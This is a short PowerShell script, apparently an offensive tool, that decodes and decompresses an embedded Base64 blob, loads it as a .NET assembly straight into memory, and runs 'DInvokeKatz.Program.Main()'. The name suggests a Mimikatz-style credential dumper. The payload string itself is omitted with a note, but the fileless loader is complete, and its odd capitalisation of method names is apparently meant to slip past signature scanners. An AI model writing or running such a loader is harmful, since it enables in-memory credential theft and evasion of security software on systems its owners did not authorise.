function Invoke-DinvokeKatz
{
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIAAAAAAAEAO...fu3bQCHb/tWu1Rn3d/L///fA1Ix+g0rf+/99fvr//Cx1+LJkA5DwA")) # NOTE: The actual 2538060-character Base64 string omitted for readability.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    [DInvokeKatz.Program]::Main()
}
